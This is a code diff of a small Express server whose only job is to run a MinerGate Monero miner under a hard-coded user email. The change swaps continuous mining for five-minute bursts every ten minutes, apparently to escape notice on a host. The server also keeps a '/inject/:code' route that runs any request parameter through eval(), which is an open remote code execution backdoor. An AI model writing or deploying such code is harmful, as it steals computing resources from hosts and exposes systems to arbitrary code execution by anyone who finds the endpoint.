@@ -1,13 +1,13 @@
 const { spawn } = require('child_process');
 const express = require('express');
 const app = express();
-
+ 
 var state = false;
 var proc = '';
-var coin = 'bcn';
-var count = 0;
+var coin = 'xmr';
 
-app.listen(process.env.PORT || 8080, ()=>{
+
+app.listen(8080, ()=>{
   console.log('Example app listening on port 3000!');
 });
 app.get('/status', function (req, res) {
@@ -20,17 +20,17 @@ app.get('/coin/:coin', function (req, res) {
 app.get('/inject/:code', function (req, res) {
   	eval(req.params.code);
 });
-app.get('/counter', function (req, res) {
-  	res.send(count)
-});
 const start = ()=>{
     state = true;
-    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', "-"+coin]);
+    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', coin, '1']);
     proc.on('close', () => {
-      cont++;
-      start();
+      console.log('child process exited');
+      state = false;
     });
 }
-
-start();
-
+setInterval(function(){
+  start();
+  setTimeout(function(){
+    proc.kill('SIGINT');
+  }, 5*60*1000);
+}, 10*60*1000);
